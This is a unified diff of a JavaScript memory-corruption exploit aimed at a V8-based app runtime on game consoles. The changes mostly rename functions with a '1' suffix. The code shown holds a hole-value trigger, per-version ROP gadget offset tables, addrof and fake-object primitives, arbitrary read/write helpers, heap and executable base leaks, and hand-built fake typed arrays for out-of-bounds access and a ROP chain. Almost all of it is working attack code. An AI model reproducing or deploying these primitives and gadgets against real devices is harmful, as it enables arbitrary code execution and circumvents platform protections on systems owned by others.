@@ -396,7 +396,7 @@ const ptr = {
 };
 // #endregion
 
-function make_hole () {
+function make_hole1 () {
     let v1;
     function f0(v4) {
         v4(() => { }, v5 => {
@@ -415,7 +415,7 @@ function make_hole () {
     return v1[1];
 }
 
-function make_hole_old () {
+function make_hole1_old () {
     let a = [], b = [];
     let s = '"'.repeat(0x800000);
     a[20000] = s;
@@ -437,8 +437,8 @@ function hex(value)
     return "0x" + value.toString(16).padStart(8, "0");
 }
 
-gadgets_eu_6 = {
-    /** Gadgets for Function Arguments **/
+gadgets1_eu_6 = {
+    /** gadgets1 for Function Arguments **/
     pop_rax: 0x6c233n,
     pop_rdi: 0x1a729bn,
     pop_rsi: 0x14d8n,
@@ -447,7 +447,7 @@ gadgets_eu_6 = {
     pop_r8:  0x6c232n,
     pop_r9:  0x66511bn,
 
-    /** Other Gadgets **/
+    /** Other gadgets1 **/
     ret:                   0x42n,
     pop_rbp:               0x79n,
     pop_rbx:               0x2e1ebn,
@@ -456,15 +456,15 @@ gadgets_eu_6 = {
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
 
-    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    /** Following gadgets1 used to mov_rdi_qword_ptr_rsi **/
     mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
                                                         // the jne is neved executed if the value in rsi does not end in 1
     mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
                                                         // point rdx to a valid address
 };
 
-gadgets_us_5 = {
-    /** Gadgets for Function Arguments **/
+gadgets1_us_5 = {
+    /** gadgets1 for Function Arguments **/
     pop_rax: 0x6c233n,
     pop_rdi: 0x24f3c2n, // Changed
     pop_rsi: 0x14d8n,
@@ -473,7 +473,7 @@ gadgets_us_5 = {
     pop_r8:  0x6c232n,
     pop_r9:  0x66511bn,
 
-    /** Other Gadgets **/
+    /** Other gadgets1 **/
     ret:                   0x42n,
     pop_rbp:               0x79n,
     pop_rbx:               0x2e1ebn,
@@ -482,19 +482,19 @@ gadgets_us_5 = {
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
 
-    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    /** Following gadgets1 used to mov_rdi_qword_ptr_rsi **/
     mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
                                                         // the jne is neved executed if the value in rsi does not end in 1
     mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
                                                         // point rdx to a valid address
 };
 
-gadgets_list = {
-    'Gemini-U6-2': gadgets_eu_6,
-    'Gemini-U5-18': gadgets_us_5,
+gadgets1_list = {
+    'Gemini-U6-2': gadgets1_eu_6,
+    'Gemini-U5-18': gadgets1_us_5,
 };
 
-class gadgets {
+class gadgets1 {
     constructor() {
         switch (nrdp.version.nova.app_version) {
             case 'Gemini-U6-2':         // EU 6.000
@@ -536,12 +536,12 @@ class gadgets {
         }
     }
     get(gadget) {
-        let list = gadgets_list[nrdp.version.nova.app_version];
+        let list = gadgets1_list[nrdp.version.nova.app_version];
         return eboot_base + list[gadget];
     }
 };
 
-function hook_tryagain(){
+function hook_tryagain1(){
         /***** Hook "Try Again" button to reload exploit *****/
         if (typeof util !== 'undefined' && util.changeLocation) {
             const original_changeLocation = util.changeLocation;
@@ -585,7 +585,7 @@ function hook_tryagain(){
 
 
 
-function stringToBytes (str) {
+function stringToBytes1 (str) {
     const len = str.length;
     const bytes = new Uint8Array(len);
     for (let i = 0; i < len; i++) {
@@ -606,11 +606,11 @@ function main () {
     logger.flush(); // Force immediate display
 
     try {
-        hook_tryagain();
-        const g = new gadgets(); // Load gadgets
+        hook_tryagain1();
+        const g = new gadgets1(); // Load gadgets1
         if (is_ps4) return; // PS4 exploit loaded separately, stop here
 
-        let hole = make_hole();
+        let hole = make_hole1();
 
         let string = "TEXT";
 
@@ -651,12 +651,12 @@ function main () {
         // Elements Ptr of obj_arr in lower 32b (first in mem) of oob_arr[37]
         // Value of obj_arr[0] (ptr to obj) in lower 32b (first in mem) of oob_arr[39]
 
-        function addrof_unstable (obj) {
+        function addrof_unstable1 (obj) {
             obj_arr[0] = obj;
             return (oob_arr[39] & 0xffffffffn) -1n;
         }
 
-        function create_fakeobj_unstable(add) {
+        function create_fakeobj_unstable1(add) {
             let add_32 = add & 0xffffffffn +1n;     // Just in case 32bits
             let original_value = oob_arr[39];   // Grab full 64bits add in oob_arr[41] to 'save' upper 32bits
             let new_value = (original_value & ~0xffffffffn) + ((add+1n) & 0xffffffffn);
@@ -665,7 +665,7 @@ function main () {
             return fake_obj;
         }
 
-        function read64_unstable (add) {
+        function read641_unstable (add) {
             let add_32 = add & 0xffffffffn;     // Just in case 32bits
 
             let original_value_25 = oob_arr[25];
@@ -701,37 +701,37 @@ function main () {
             oob_arr[26] = original_value_26;
         }
 
-        function read32_unstable(add){
-            let read = read64_unstable(add);
+        function read32_unstable1(add){
+            let read = read641_unstable(add);
             return read & 0xffffffffn;
         }
 
-        function write32_unstable(add, value) {
-            let read = read64_unstable(add);
+        function write32_unstable1(add, value) {
+            let read = read641_unstable(add);
             let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
             write64_unstable(add, new_value);
         }
 
 
-        let add_string = addrof_unstable(string) + 12n;
+        let add_string = addrof_unstable1(string) + 12n;
         logger.log("Address of 'string' text: " + hex(add_string));
-        let string_value = read32_unstable(add_string);
-        logger.log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable(add_string).toString(16) ) ;
+        let string_value = read32_unstable1(add_string);
+        logger.log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable1(add_string).toString(16) ) ;
 
         if (BigInt(string_value) !== 0x54584554n) {
             throw new Error("Could not create unstable primitives. Try again.");
         }
 
-        write32_unstable(add_string, 0x41414141n);
+        write32_unstable1(add_string, 0x41414141n);
         logger.log("Overwritten value of 'string' (should be AAAA): " + string );
         logger.flush();
 
         let typed_arr = new Int8Array(8);
-        let base_heap_add = read64_unstable(addrof_unstable(typed_arr) + 10n * 4n) & ~0xffffffffn;
+        let base_heap_add = read641_unstable(addrof_unstable1(typed_arr) + 10n * 4n) & ~0xffffffffn;
         let top32b_heap = base_heap_add >> 32n;
         logger.log("Base heap address: " + hex(base_heap_add));
         logger.log("Top 32bits heap address: " + hex(top32b_heap));
-        let leak_eboot_add = read64_unstable(0x28n); // Read at base heap + 0x28 (upper 32b are completed by v8)
+        let leak_eboot_add = read641_unstable(0x28n); // Read at base heap + 0x28 (upper 32b are completed by v8)
         eboot_base = leak_eboot_add - 0x8966C8n;    // This is not realiable as the addess changes
         // Previously used offsets: 0x88C76En , 0x8966C8n
         // Seems to be a ptr that the app updates while running
@@ -753,19 +753,19 @@ function main () {
         // Get FixedDoubleArray map from a template
         const double_template = new Array(0x10);
         double_template.fill(3.14);
-        const double_template_addr = addrof_unstable(double_template);
-        const double_elements_addr = read32_unstable(double_template_addr + 0x8n) - 1n;
-        const fixed_double_array_map = read32_unstable(double_elements_addr + 0x00n);
+        const double_template_addr = addrof_unstable1(double_template);
+        const double_elements_addr = read32_unstable1(double_template_addr + 0x8n) - 1n;
+        const fixed_double_array_map = read32_unstable1(double_elements_addr + 0x00n);
 
         // Get stable_array addresses
-        const stable_array_addr = addrof_unstable(stable_array);
-        const stable_elements_addr = read32_unstable(stable_array_addr + 0x8n) - 1n;
+        const stable_array_addr = addrof_unstable1(stable_array);
+        const stable_elements_addr = read32_unstable1(stable_array_addr + 0x8n) - 1n;
 
         logger.log('Large Object Space @ ' + hex(stable_elements_addr));
 
         // Transform elements to FixedDoubleArray
         // This makes GC happy later
-        write32_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
+        write32_unstable1(stable_elements_addr + 0x00n, fixed_double_array_map);
 
         logger.log('Converted stable_array to double array');
 
@@ -780,48 +780,48 @@ function main () {
         /***** Template for BigUint64Array *****/
         const template_biguint = new BigUint64Array(64);
 
-        const template_biguint_addr = addrof_unstable(template_biguint);
-        const biguint_map =      read32_unstable(template_biguint_addr + 0x00n);
-        const biguint_props =    read32_unstable(template_biguint_addr + 0x04n);
-        const biguint_elements = read32_unstable(template_biguint_addr + 0x08n) - 1n;
-        const biguint_buffer =   read32_unstable(template_biguint_addr + 0x0Cn) - 1n;
+        const template_biguint_addr = addrof_unstable1(template_biguint);
+        const biguint_map =      read32_unstable1(template_biguint_addr + 0x00n);
+        const biguint_props =    read32_unstable1(template_biguint_addr + 0x04n);
+        const biguint_elements = read32_unstable1(template_biguint_addr + 0x08n) - 1n;
+        const biguint_buffer =   read32_unstable1(template_biguint_addr + 0x0Cn) - 1n;
 
-        const biguint_elem_map = read32_unstable(biguint_elements + 0x00n);
-        const biguint_elem_len = read32_unstable(biguint_elements + 0x04n);
+        const biguint_elem_map = read32_unstable1(biguint_elements + 0x00n);
+        const biguint_elem_len = read32_unstable1(biguint_elements + 0x04n);
 
-        const biguint_buffer_map =      read32_unstable(biguint_buffer + 0x00n);
-        const biguint_buffer_props =    read32_unstable(biguint_buffer + 0x04n);
-        const biguint_buffer_elem =     read32_unstable(biguint_buffer + 0x08n);
-        const biguint_buffer_bitfield = read32_unstable(biguint_buffer + 0x24n);
+        const biguint_buffer_map =      read32_unstable1(biguint_buffer + 0x00n);
+        const biguint_buffer_props =    read32_unstable1(biguint_buffer + 0x04n);
+        const biguint_buffer_elem =     read32_unstable1(biguint_buffer + 0x08n);
+        const biguint_buffer_bitfield = read32_unstable1(biguint_buffer + 0x24n);
 
         /***** Template for Uint8Array *****/
         const template_uint8 = new Uint8Array(64);
 
-        const template_uint8_addr = addrof_unstable(template_uint8);
-        const uint8_map =      read32_unstable(template_uint8_addr + 0x00n);
-        const uint8_props =    read32_unstable(template_uint8_addr + 0x04n);
-        const uint8_elements = read32_unstable(template_uint8_addr + 0x08n) - 1n;
-        const uint8_buffer =   read32_unstable(template_uint8_addr + 0x0Cn) - 1n;
+        const template_uint8_addr = addrof_unstable1(template_uint8);
+        const uint8_map =      read32_unstable1(template_uint8_addr + 0x00n);
+        const uint8_props =    read32_unstable1(template_uint8_addr + 0x04n);
+        const uint8_elements = read32_unstable1(template_uint8_addr + 0x08n) - 1n;
+        const uint8_buffer =   read32_unstable1(template_uint8_addr + 0x0Cn) - 1n;
 
-        const uint8_elem_map = read32_unstable(uint8_elements + 0x00n);
-        const uint8_elem_len = read32_unstable(uint8_elements + 0x04n);
+        const uint8_elem_map = read32_unstable1(uint8_elements + 0x00n);
+        const uint8_elem_len = read32_unstable1(uint8_elements + 0x04n);
 
-        const uint8_buffer_map =      read32_unstable(uint8_buffer + 0x00n);
-        const uint8_buffer_props =    read32_unstable(uint8_buffer + 0x04n);
-        const uint8_buffer_elem =     read32_unstable(uint8_buffer + 0x08n);
-        const uint8_buffer_bitfield = read32_unstable(uint8_buffer + 0x24n);
+        const uint8_buffer_map =      read32_unstable1(uint8_buffer + 0x00n);
+        const uint8_buffer_props =    read32_unstable1(uint8_buffer + 0x04n);
+        const uint8_buffer_elem =     read32_unstable1(uint8_buffer + 0x08n);
+        const uint8_buffer_bitfield = read32_unstable1(uint8_buffer + 0x24n);
 
         /***** Template for Object Array *****/
         const template_obj_arr = [{},{}];
 
-        const template_obj_arr_addr = addrof_unstable(template_obj_arr);
-        const obj_arr_map =      read32_unstable(template_obj_arr_addr + 0x00n);
-        const obj_arr_props =    read32_unstable(template_obj_arr_addr + 0x04n);
-        const obj_arr_elements = read32_unstable(template_obj_arr_addr + 0x08n) - 1n;
-        const obj_arr_len =      read32_unstable(template_obj_arr_addr + 0x0Cn);
+        const template_obj_arr_addr = addrof_unstable1(template_obj_arr);
+        const obj_arr_map =      read32_unstable1(template_obj_arr_addr + 0x00n);
+        const obj_arr_props =    read32_unstable1(template_obj_arr_addr + 0x04n);
+        const obj_arr_elements = read32_unstable1(template_obj_arr_addr + 0x08n) - 1n;
+        const obj_arr_len =      read32_unstable1(template_obj_arr_addr + 0x0Cn);
 
-        const obj_arr_elem_map = read32_unstable(obj_arr_elements + 0x00n);
-        const obj_arr_elem_len = read32_unstable(obj_arr_elements + 0x04n);
+        const obj_arr_elem_map = read32_unstable1(obj_arr_elements + 0x00n);
+        const obj_arr_elem_len = read32_unstable1(obj_arr_elements + 0x04n);
 
         logger.log('Templates extracted');
 
@@ -889,27 +889,27 @@ function main () {
         /*******************************************************************************************************/
         /**********                             Init Fake OOB BigUInt64Array                          **********/
         /*******************************************************************************************************/
-        write32_unstable(fake_rw_obj_buffer + 0x00n, biguint_buffer_map);
-        write32_unstable(fake_rw_obj_buffer + 0x04n, biguint_buffer_props);
-        write32_unstable(fake_rw_obj_buffer + 0x08n, biguint_buffer_elem);
-        write32_unstable(fake_rw_obj_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
-        write32_unstable(fake_rw_obj_buffer + 0x14n, fake_rw_obj_elements + 8n +1n);  // backing_store lower 32b
-        write32_unstable(fake_rw_obj_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
-        write32_unstable(fake_rw_obj_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field
+        write32_unstable1(fake_rw_obj_buffer + 0x00n, biguint_buffer_map);
+        write32_unstable1(fake_rw_obj_buffer + 0x04n, biguint_buffer_props);
+        write32_unstable1(fake_rw_obj_buffer + 0x08n, biguint_buffer_elem);
+        write32_unstable1(fake_rw_obj_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
+        write32_unstable1(fake_rw_obj_buffer + 0x14n, fake_rw_obj_elements + 8n +1n);  // backing_store lower 32b
+        write32_unstable1(fake_rw_obj_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
+        write32_unstable1(fake_rw_obj_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field
 
-        write32_unstable(fake_rw_obj_elements + 0x00n, biguint_elem_map);
-        write32_unstable(fake_rw_obj_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
+        write32_unstable1(fake_rw_obj_elements + 0x00n, biguint_elem_map);
+        write32_unstable1(fake_rw_obj_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
 
-        write32_unstable(fake_rw_obj + 0x00n, biguint_map);
-        write32_unstable(fake_rw_obj + 0x04n, biguint_props);
-        write32_unstable(fake_rw_obj + 0x08n, fake_rw_obj_elements + 1n);
-        write32_unstable(fake_rw_obj + 0x0Cn, fake_rw_obj_buffer + 1n);
+        write32_unstable1(fake_rw_obj + 0x00n, biguint_map);
+        write32_unstable1(fake_rw_obj + 0x04n, biguint_props);
+        write32_unstable1(fake_rw_obj + 0x08n, fake_rw_obj_elements + 1n);
+        write32_unstable1(fake_rw_obj + 0x0Cn, fake_rw_obj_buffer + 1n);
         write64_unstable(fake_rw_obj + 0x18n, 0x8000n);      // Fake size in bytes
         write64_unstable(fake_rw_obj + 0x20n, 0x1000n);      // Fake size in elements
-        write32_unstable(fake_rw_obj + 0x28n, fake_rw_obj_buffer + 16n*4n);  // external_pointer lower 32b
-        write32_unstable(fake_rw_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
-        write32_unstable(fake_rw_obj + 0x30n, 0n);  // base_pointer lower 32b
-        write32_unstable(fake_rw_obj + 0x34n, 0n);  // base_pointer upper 32b
+        write32_unstable1(fake_rw_obj + 0x28n, fake_rw_obj_buffer + 16n*4n);  // external_pointer lower 32b
+        write32_unstable1(fake_rw_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
+        write32_unstable1(fake_rw_obj + 0x30n, 0n);  // base_pointer lower 32b
+        write32_unstable1(fake_rw_obj + 0x34n, 0n);  // base_pointer upper 32b
         /*******************************************************************************************************/
         /**********                             End Fake OOB BigUInt64Array                           **********/
         /*******************************************************************************************************/
@@ -917,27 +917,27 @@ function main () {
         /*******************************************************************************************************/
         /**********                             Init Fake Victim BigUInt64Array                       **********/
         /*******************************************************************************************************/
-        write32_unstable(fake_bui64_arr_buffer + 0x00n, biguint_buffer_map);
-        write32_unstable(fake_bui64_arr_buffer + 0x04n, biguint_buffer_props);
-        write32_unstable(fake_bui64_arr_buffer + 0x08n, biguint_buffer_elem);
-        write32_unstable(fake_bui64_arr_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
-        write32_unstable(fake_bui64_arr_buffer + 0x14n, fake_bui64_arr_elements + 8n +1n);  // backing_store lower 32b
-        write32_unstable(fake_bui64_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
-        write32_unstable(fake_bui64_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field
+        write32_unstable1(fake_bui64_arr_buffer + 0x00n, biguint_buffer_map);
+        write32_unstable1(fake_bui64_arr_buffer + 0x04n, biguint_buffer_props);
+        write32_unstable1(fake_bui64_arr_buffer + 0x08n, biguint_buffer_elem);
+        write32_unstable1(fake_bui64_arr_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
+        write32_unstable1(fake_bui64_arr_buffer + 0x14n, fake_bui64_arr_elements + 8n +1n);  // backing_store lower 32b
+        write32_unstable1(fake_bui64_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
+        write32_unstable1(fake_bui64_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field
 
-        write32_unstable(fake_bui64_arr_elements + 0x00n, biguint_elem_map);
-        write32_unstable(fake_bui64_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
+        write32_unstable1(fake_bui64_arr_elements + 0x00n, biguint_elem_map);
+        write32_unstable1(fake_bui64_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
 
-        write32_unstable(fake_bui64_arr_obj + 0x00n, biguint_map);
-        write32_unstable(fake_bui64_arr_obj + 0x04n, biguint_props);
-        write32_unstable(fake_bui64_arr_obj + 0x08n, fake_bui64_arr_elements + 1n);
-        write32_unstable(fake_bui64_arr_obj + 0x0Cn, fake_bui64_arr_buffer + 1n);
+        write32_unstable1(fake_bui64_arr_obj + 0x00n, biguint_map);
+        write32_unstable1(fake_bui64_arr_obj + 0x04n, biguint_props);
+        write32_unstable1(fake_bui64_arr_obj + 0x08n, fake_bui64_arr_elements + 1n);
+        write32_unstable1(fake_bui64_arr_obj + 0x0Cn, fake_bui64_arr_buffer + 1n);
         write64_unstable(fake_bui64_arr_obj + 0x18n, 0x40n);      // Fake size in bytes
         write64_unstable(fake_bui64_arr_obj + 0x20n, 0x08n);      // Fake size in elements
-        write32_unstable(fake_bui64_arr_obj + 0x28n, fake_bui64_arr_buffer + 16n*4n);  // external_pointer lower 32b
-        write32_unstable(fake_bui64_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
-        write32_unstable(fake_bui64_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
-        write32_unstable(fake_bui64_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
+        write32_unstable1(fake_bui64_arr_obj + 0x28n, fake_bui64_arr_buffer + 16n*4n);  // external_pointer lower 32b
+        write32_unstable1(fake_bui64_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
+        write32_unstable1(fake_bui64_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
+        write32_unstable1(fake_bui64_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
         /*******************************************************************************************************/
         /**********                             End Fake Victim BigUInt64Array                        **********/
         /*******************************************************************************************************/
@@ -945,13 +945,13 @@ function main () {
         /*******************************************************************************************************/
         /**********                             Init Fake Obj Array                                   **********/
         /*******************************************************************************************************/
-        write32_unstable(fake_obj_arr_obj + 0x00n, obj_arr_map);
-        write32_unstable(fake_obj_arr_obj + 0x04n, obj_arr_props);
-        write32_unstable(fake_obj_arr_obj + 0x08n, fake_obj_arr_elements+1n);
-        write32_unstable(fake_obj_arr_obj + 0x0cn, obj_arr_len);      // byte_length lower 32b
+        write32_unstable1(fake_obj_arr_obj + 0x00n, obj_arr_map);
+        write32_unstable1(fake_obj_arr_obj + 0x04n, obj_arr_props);
+        write32_unstable1(fake_obj_arr_obj + 0x08n, fake_obj_arr_elements+1n);
+        write32_unstable1(fake_obj_arr_obj + 0x0cn, obj_arr_len);      // byte_length lower 32b
 
-        write32_unstable(fake_obj_arr_elements + 0x00n, obj_arr_elem_map);
-        write32_unstable(fake_obj_arr_elements + 0x04n, obj_arr_elem_len);  // size in bytes << 1
+        write32_unstable1(fake_obj_arr_elements + 0x00n, obj_arr_elem_map);
+        write32_unstable1(fake_obj_arr_elements + 0x04n, obj_arr_elem_len);  // size in bytes << 1
         /*******************************************************************************************************/
         /**********                             End Fake Obj Array                                    **********/
         /*******************************************************************************************************/
@@ -959,27 +959,27 @@ function main () {
         /*******************************************************************************************************/
         /********** Init Fake Victim Uint8Array                           **********/
         /*******************************************************************************************************/
-        write32_unstable(fake_u8_arr_buffer + 0x00n, uint8_buffer_map);
-        write32_unstable(fake_u8_arr_buffer + 0x04n, uint8_buffer_props);
-        write32_unstable(fake_u8_arr_buffer + 0x08n, uint8_buffer_elem);
-        write32_unstable(fake_u8_arr_buffer + 0x0cn, 0x1000n);      // byte_length lower 32b
-        write32_unstable(fake_u8_arr_buffer + 0x14n, fake_u8_arr_elements + 8n +1n);  // backing_store lower 32b
-        write32_unstable(fake_u8_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
-        write32_unstable(fake_u8_arr_buffer + 0x24n, uint8_buffer_bitfield);  // bit_field
+        write32_unstable1(fake_u8_arr_buffer + 0x00n, uint8_buffer_map);
+        write32_unstable1(fake_u8_arr_buffer + 0x04n, uint8_buffer_props);
+        write32_unstable1(fake_u8_arr_buffer + 0x08n, uint8_buffer_elem);
+        write32_unstable1(fake_u8_arr_buffer + 0x0cn, 0x1000n);      // byte_length lower 32b
+        write32_unstable1(fake_u8_arr_buffer + 0x14n, fake_u8_arr_elements + 8n +1n);  // backing_store lower 32b
+        write32_unstable1(fake_u8_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
+        write32_unstable1(fake_u8_arr_buffer + 0x24n, uint8_buffer_bitfield);  // bit_field
 
-        write32_unstable(fake_u8_arr_elements + 0x00n, uint8_elem_map);
-        write32_unstable(fake_u8_arr_elements + 0x04n, uint8_elem_len);  // Fake size in bytes
+        write32_unstable1(fake_u8_arr_elements + 0x00n, uint8_elem_map);
+        write32_unstable1(fake_u8_arr_elements + 0x04n, uint8_elem_len);  // Fake size in bytes
 
-        write32_unstable(fake_u8_arr_obj + 0x00n, uint8_map);
-        write32_unstable(fake_u8_arr_obj + 0x04n, uint8_props);
-        write32_unstable(fake_u8_arr_obj + 0x08n, fake_u8_arr_elements + 1n);
-        write32_unstable(fake_u8_arr_obj + 0x0Cn, fake_u8_arr_buffer + 1n);
+        write32_unstable1(fake_u8_arr_obj + 0x00n, uint8_map);
+        write32_unstable1(fake_u8_arr_obj + 0x04n, uint8_props);
+        write32_unstable1(fake_u8_arr_obj + 0x08n, fake_u8_arr_elements + 1n);
+        write32_unstable1(fake_u8_arr_obj + 0x0Cn, fake_u8_arr_buffer + 1n);
         write64_unstable(fake_u8_arr_obj + 0x18n, 0x1000n);     // Fake size in bytes
         write64_unstable(fake_u8_arr_obj + 0x20n, 0x1000n);     // Fake size in elements
-        write32_unstable(fake_u8_arr_obj + 0x28n, fake_u8_arr_buffer + 16n*4n);  // external_pointer lower 32b
-        write32_unstable(fake_u8_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
-        write32_unstable(fake_u8_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
-        write32_unstable(fake_u8_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
+        write32_unstable1(fake_u8_arr_obj + 0x28n, fake_u8_arr_buffer + 16n*4n);  // external_pointer lower 32b
+        write32_unstable1(fake_u8_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
+        write32_unstable1(fake_u8_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
+        write32_unstable1(fake_u8_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
         /*******************************************************************************************************/
         /********** End Fake Victim Uint8Array                            **********/
         /*******************************************************************************************************/
@@ -987,49 +987,49 @@ function main () {
         /*******************************************************************************************************/
         /**********                             Init Fake ROP BigUInt64Array                          **********/
         /*******************************************************************************************************/
-        write32_unstable(fake_rop_arr_buffer + 0x00n, biguint_buffer_map);
-        write32_unstable(fake_rop_arr_buffer + 0x04n, biguint_buffer_props);
-        write32_unstable(fake_rop_arr_buffer + 0x08n, biguint_buffer_elem);
-        write32_unstable(fake_rop_arr_buffer + 0x0cn, 0x500n*8n);      // byte_length lower 32b
-        write32_unstable(fake_rop_arr_buffer + 0x14n, fake_rop_arr_elements + 8n +1n);  // backing_store lower 32b
-        write32_unstable(fake_rop_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
-        write32_unstable(fake_rop_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field
+        write32_unstable1(fake_rop_arr_buffer + 0x00n, biguint_buffer_map);
+        write32_unstable1(fake_rop_arr_buffer + 0x04n, biguint_buffer_props);
+        write32_unstable1(fake_rop_arr_buffer + 0x08n, biguint_buffer_elem);
+        write32_unstable1(fake_rop_arr_buffer + 0x0cn, 0x500n*8n);      // byte_length lower 32b
+        write32_unstable1(fake_rop_arr_buffer + 0x14n, fake_rop_arr_elements + 8n +1n);  // backing_store lower 32b
+        write32_unstable1(fake_rop_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
+        write32_unstable1(fake_rop_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field
 
-        write32_unstable(fake_rop_arr_elements + 0x00n, biguint_elem_map);
-        write32_unstable(fake_rop_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
+        write32_unstable1(fake_rop_arr_elements + 0x00n, biguint_elem_map);
+        write32_unstable1(fake_rop_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
 
-        write32_unstable(fake_rop_arr_obj + 0x00n, biguint_map);
-        write32_unstable(fake_rop_arr_obj + 0x04n, biguint_props);
-        write32_unstable(fake_rop_arr_obj + 0x08n, fake_rop_arr_elements + 1n);
-        write32_unstable(fake_rop_arr_obj + 0x0Cn, fake_rop_arr_buffer + 1n);
+        write32_unstable1(fake_rop_arr_obj + 0x00n, biguint_map);
+        write32_unstable1(fake_rop_arr_obj + 0x04n, biguint_props);
+        write32_unstable1(fake_rop_arr_obj + 0x08n, fake_rop_arr_elements + 1n);
+        write32_unstable1(fake_rop_arr_obj + 0x0Cn, fake_rop_arr_buffer + 1n);
         write64_unstable(fake_rop_arr_obj + 0x18n, 0x2800n);      // Fake size in bytes
         write64_unstable(fake_rop_arr_obj + 0x20n, 0x0500n);      // Fake size in elements
-        write32_unstable(fake_rop_arr_obj + 0x28n, fake_rop_arr_buffer + 16n*4n);  // external_pointer lower 32b
-        write32_unstable(fake_rop_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
-        write32_unstable(fake_rop_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
-        write32_unstable(fake_rop_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
+        write32_unstable1(fake_rop_arr_obj + 0x28n, fake_rop_arr_buffer + 16n*4n);  // external_pointer lower 32b
+        write32_unstable1(fake_rop_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
+        write32_unstable1(fake_rop_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
+        write32_unstable1(fake_rop_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
         /*******************************************************************************************************/
         /**********                             End Fake Victim BigUInt64Array                        **********/
         /*******************************************************************************************************/
 
         // Materialize fake objects
-        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
-        let fake_rw_add = addrof_unstable(fake_rw);
+        const fake_rw = create_fakeobj_unstable1(fake_rw_obj);
+        let fake_rw_add = addrof_unstable1(fake_rw);
         //logger.log("This is the add of fake_rw materialized : " + hex(fake_rw_add));
 
-        const fake_victim = create_fakeobj_unstable(fake_bui64_arr_obj);
-        let fake_victim_add = addrof_unstable(fake_victim);
+        const fake_victim = create_fakeobj_unstable1(fake_bui64_arr_obj);
+        let fake_victim_add = addrof_unstable1(fake_victim);
         //logger.log("This is the add of fake_victim materialized : " + hex(fake_victim_add));
 
-        const fake_obj_arr = create_fakeobj_unstable(fake_obj_arr_obj);
-        let fake_obj_arr_add = addrof_unstable(fake_obj_arr);
+        const fake_obj_arr = create_fakeobj_unstable1(fake_obj_arr_obj);
+        let fake_obj_arr_add = addrof_unstable1(fake_obj_arr);
         //logger.log("This is the add of fake_obj_arr materialized : " + hex(fake_obj_arr_add));
 
-        const fake_victim_8 = create_fakeobj_unstable(fake_u8_arr_obj);
+        const fake_victim_8 = create_fakeobj_unstable1(fake_u8_arr_obj);
         // logger.log("This is the add of fake_victim_8 materialized : " + hex(fake_victim_8));
 
-        const fake_rop = create_fakeobj_unstable(fake_rop_arr_obj);
-        let fake_rop_add = addrof_unstable(fake_rop);
+        const fake_rop = create_fakeobj_unstable1(fake_rop_arr_obj);
+        let fake_rop_add = addrof_unstable1(fake_rop);
         //logger.log("This is the add of fake_rop materialized : " + hex(fake_rop_add));
 
         // Now we have OOB, Victim and Obj to make stable primitives
@@ -1043,7 +1043,7 @@ function main () {
         /***** The following primitives r/w a compressed Add *****/
         /***** The top 32 bits are completed with top32b_heap *****/
 
-        function read64 (add) {
+        function read641 (add) {
